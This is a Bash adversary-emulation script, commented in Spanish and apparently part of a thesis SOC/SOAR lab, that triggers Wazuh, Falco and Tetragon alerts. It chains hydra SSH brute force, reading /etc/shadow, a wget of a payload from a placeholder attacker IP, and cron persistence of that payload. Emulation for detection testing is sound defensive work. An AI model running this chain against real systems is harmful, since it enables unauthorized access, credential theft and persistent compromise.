#!/usr/bin/env bash
# ============================================================
#  attack-demo.sh — Emulación de adversario para validar el SOC
#  Proyecto SOC + SOAR (TFM)
# ------------------------------------------------------------
#  ⚠️  AUTORIZACIÓN Y ALCANCE
#  Ejecuta este script ÚNICAMENTE contra TUS PROPIAS máquinas
#  de laboratorio, en una red aislada y con autorización.
#  Su único fin es generar alertas para comprobar la detección
#  y la respuesta automatizada del SOC. No lo uses contra
#  sistemas de terceros.
# ------------------------------------------------------------
#  Cada fase está mapeada a MITRE ATT&CK y al sensor que la
#  detecta. Hay pausas entre fases para no saturar la cola de
#  análisis de Ollama (CPU-bound).
# ============================================================
set -u

# --- Parámetros (RELLENA con los de tu laboratorio) ----------
TARGET="${TARGET:-<IP_VICTIMA_VLAN20>}"        # host víctima (DMZ)
SSH_USER="${SSH_USER:-victima}"                # usuario objetivo
WORDLIST="${WORDLIST:-./wordlist.txt}"         # diccionario propio (NO incluido)
PAYLOAD_URL="${PAYLOAD_URL:-http://<IP_ATACANTE_VLAN40>/payload.sh}"
PAUSA="${PAUSA:-75}"                           # segundos entre fases

# --- Helpers -------------------------------------------------
step()  { echo; echo "==================================================";
          echo "  FASE $1: $2"; echo "=================================================="; }
pause() { echo "  (espera ${PAUSA}s para no saturar el análisis...)"; sleep "${PAUSA}"; }
run()   { ssh -o StrictHostKeyChecking=no "${SSH_USER}@${TARGET}" "$1"; }

# --- Fase 1 · Acceso inicial — Fuerza bruta SSH (T1110) ------
step 1 "Fuerza bruta SSH (hydra) — T1110  [detecta: Wazuh]"
hydra -l "${SSH_USER}" -P "${WORDLIST}" -t 4 -f "ssh://${TARGET}" || true
pause

# --- Fase 2 · Ejecución — Shell interactiva (T1059) ---------
step 2 "Shell interactiva — T1059.004  [detecta: Falco]"
run "bash -i -c 'echo shell-interactiva-activa'" || true
pause

# --- Fase 3 · Descubrimiento (T1033 / T1082 / T1087) --------
step 3 "Descubrimiento del sistema — T1033/T1082/T1087  [Tetragon/Falco]"
run "whoami; id; uname -a; hostname" || true
pause

# --- Fase 4 · Credenciales — /etc/shadow (T1003) ★ ----------
step 4 "Acceso a /etc/shadow (DISPARA EL SOAR) — T1003.008  [Tetragon/Falco]"
# Si la TracingPolicy de Tetragon está activa, este proceso
# debería ser terminado con SIGKILL a nivel de kernel.
run "cat /etc/shadow" || true
pause

# --- Fase 5 · Transferencia — descarga de payload (T1105) ---
step 5 "Descarga de payload — T1105  [Falco (+ Suricata)]"
run "wget -q '${PAYLOAD_URL}' -O /tmp/payload.sh && chmod +x /tmp/payload.sh" || true
pause

# --- Fase 6 · Persistencia — cron (T1053) -------------------
step 6 "Persistencia vía cron — T1053.003  [Tetragon/Falco]"
run "(crontab -l 2>/dev/null; echo '*/5 * * * * /tmp/payload.sh') | crontab -" || true
pause

echo
echo "=================================================="
echo "  Cadena completa. Revisa Wazuh, TheHive y Discord."
echo "=================================================="
